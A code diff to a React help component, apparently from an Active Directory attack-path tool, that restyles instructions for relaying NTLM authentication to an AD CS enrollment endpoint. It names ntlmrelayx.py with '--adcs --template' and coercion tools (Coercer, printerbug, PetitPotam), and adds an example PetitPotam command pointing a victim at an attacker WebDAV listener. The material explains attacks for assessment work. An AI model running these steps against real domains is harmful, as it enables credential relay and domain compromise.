@@ -14,46 +14,64 @@
 //
 // SPDX-License-Identifier: Apache-2.0
 
+import { Link } from '@mui/material';
 import { Typography } from 'doodle-ui';
 import { FC } from 'react';
-import CodeController from '../CodeController/CodeController';
 
 const LinuxAbuse: FC = () => {
     return (
         <>
-            <Typography variant={'body2'}>
-                1. Start the Relay Server The NTLM relay can be executed with{' '}
-                <a
+            <Typography variant='body1'>1. Start the Relay Server</Typography>
+            <Typography variant='body2'>
+                The NTLM relay can be executed with{' '}
+                <Link
                     target='_blank'
                     rel='noopener noreferrer'
-                    href={'https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'}>
+                    href='https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'>
                     ntlmrelayx.py
-                </a>
+                </Link>
                 . To relay to the enterprise CA and enroll a certificate, specify the HTTP(S) endpoint as the target and
-                use the arguments
-                <CodeController>{'--adcs --template <TEMPLATE_NAME>.'}</CodeController>
+                use the arguments:
             </Typography>
+            <Typography component={'pre'}>{'--adcs --template <TEMPLATE_NAME>'}</Typography>
 
-            <Typography variant={'body2'}>
-                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
-                <a
+            <Typography variant='body1'>2. Coerce the Target Computer</Typography>
+            <Typography variant='body2'>
+                Several coercion methods are documented here:{' '}
+                <Link
                     target='_blank'
                     rel='noopener noreferrer'
-                    href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                    href='https://github.com/p0dalirius/windows-coerced-authentication-methods'>
                     Windows Coerced Authentication Methods
-                </a>
+                </Link>
                 . Examples of tools include:
-                <a
-                    target='_blank'
-                    rel='noopener noreferrer'
-                    href={'https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py'}>
-                    printerbug.py
-                </a>
-                <a target='_blank' rel='noopener noreferrer' href={'https://github.com/topotam/PetitPotam'}>
-                    PetitPotam
-                </a>
+                <ul style={{ paddingLeft: '1.5em' }}>
+                    <li>
+                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/p0dalirius/Coercer'>
+                            Coercer.py
+                        </Link>
+                    </li>
+                    <li>
+                        <Link
+                            target='_blank'
+                            rel='noopener noreferrer'
+                            href='https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py'>
+                            printerbug.py
+                        </Link>
+                    </li>
+                    <li>
+                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/topotam/PetitPotam'>
+                            PetitPotam
+                        </Link>
+                    </li>
+                </ul>
+            </Typography>
+            <Typography variant='body2'>
                 To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
-                Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE.
+                Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
+            </Typography>
+            <Typography component={'pre'}>
+                {'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'}
             </Typography>
         </>
     );
